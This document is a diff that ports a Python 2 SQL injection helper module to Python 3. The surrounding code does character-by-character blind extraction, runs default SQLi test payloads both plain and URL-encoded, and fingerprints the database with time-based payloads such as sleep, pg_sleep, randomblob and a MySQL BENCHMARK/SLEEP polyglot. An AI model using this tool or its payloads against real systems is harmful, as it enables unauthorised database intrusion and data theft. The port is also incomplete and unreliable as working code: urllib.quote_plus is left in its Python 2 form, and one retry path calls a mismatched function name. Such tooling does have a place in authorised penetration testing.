@@ -2,7 +2,7 @@ from enum import Enum
 import string
 from string import ascii_lowercase, ascii_uppercase
 import urllib
-from utils import *
+from .utils import *
 
 
 def general_brute_force_substr(func, payload, letters="", lower=False, upper=False, number=False, punct=False):
@@ -19,7 +19,7 @@ def general_brute_force_substr(func, payload, letters="", lower=False, upper=Fal
                             return;
                     except Exception as ex:
                         show_exception(ex)
-                        print "Retrying last..."
+                        print("Retrying last...")
                         hasError = True
 
                     
@@ -34,7 +34,7 @@ def general_brute_force_substr(func, payload, letters="", lower=False, upper=Fal
                             return;
                     except Exception as ex:
                         show_exception(ex)
-                        print "Retrying last..."
+                        print("Retrying last...")
                         hasError = True
         if number:
             for k in range(0,10):
@@ -47,7 +47,7 @@ def general_brute_force_substr(func, payload, letters="", lower=False, upper=Fal
                             return;
                     except Exception as ex:
                         show_exception(ex)
-                        print "Retrying last..."
+                        print("Retrying last...")
                         hasError = True
 
         if punct:
@@ -62,12 +62,12 @@ def general_brute_force_substr(func, payload, letters="", lower=False, upper=Fal
                             return;
                     except Exception as ex:
                         show_exception(ex)
-                        print "Retrying last..."
+                        print("Retrying last...")
                         hasError = True
         print("Result: " + "'" + letters + "'")
     except Exception as ex:
         show_exception(ex)
-        print "Retrying complete round..."
+        print("Retrying complete round...")
         general_brute_force_substr(func, payload, letters, lower, upper, number, punct)
         return;
 
@@ -84,12 +84,12 @@ def all_256_character_as_char_brute_force_substr(func, payload, numbers_as_array
                         return;
                 except Exception as ex:
                     show_exception(ex)
-                    print "Retrying last..."
+                    print("Retrying last...")
                     hasError = True
         print("Result: " + "'" + numbers_as_array + "'")
     except Exception as ex:
         show_exception(ex)
-        print "Retrying complete round..."
+        print("Retrying complete round...")
         all_256_character_brute_force_substr(func, payload, numbers_as_array)
         return;
 
@@ -118,12 +118,12 @@ def all_256_character_as_hex_brute_force_substr(func, payload, letters_as_hex):
                         return;
                 except Exception as ex:
                     show_exception(ex)
-                    print "Retrying last..."
+                    print("Retrying last...")
                     hasError = True
         print("Result: " + "'" + letters_as_hex + "'")
     except Exception as ex:
         show_exception(ex)
-        print "Retrying complete round..."
+        print("Retrying complete round...")
         all_256_character_as_hex_brute_force_substr(func, payload, letters_as_hex)
         return;
 
@@ -184,14 +184,14 @@ def try_default_SQLi_tests(func):
         "4-1" #Should be id=3
     ]
     for payload in payloads:
-        if raw_input("Run payload (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
+        if input("Run payload (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
             func(payload)
             show_success_or_danger()
     for payload in payloads:
-        if raw_input("Run payload url encoded (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
+        if input("Run payload url encoded (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
             func(urllib.quote_plus(payload))
             show_success_or_danger()
-        if raw_input("Run payload url encoded twice (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
+        if input("Run payload url encoded twice (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
             func(urllib.quote_plus(urllib.quote_plus(payload)))
             show_success_or_danger()
 
@@ -206,23 +206,23 @@ def dbms_detection_values(dbms):
     print("\nYou can also refer to: https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint\n")
     if dbms == DBMS.MySQL:
         array = ["sleep(5)", "CONCAT('a','a')", "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/"]
-        print ', '.join(array)
+        print(', '.join(array))
         return array
     if dbms == DBMS.PostgreSQL:
         array = ["pg_sleep(5)", "'a' || 'a'"]
-        print ', '.join(array)
+        print(', '.join(array))
         return array
     if dbms == DBMS.SQLite:
         array = ["randomblob(100000000)"]
-        print ', '.join(array)
+        print(', '.join(array))
         return array
     if dbms == DBMS.MSSQL:
         array = ["@@version", "'a' + 'a'"]
-        print ', '.join(array)
+        print(', '.join(array))
         return array
 
 def detect_dbms(func):
     for dbms in [DBMS.MySQL, DBMS.PostgreSQL, DBMS.SQLite, DBMS.MSSQL]:
         for dbmsVal in dbms_detection_values(dbms):
             if func(dbmsVal):
-                print dbmsVal + " seemed to work for dbms: " + dbms
+                print(dbmsVal + " seemed to work for dbms: " + dbms)
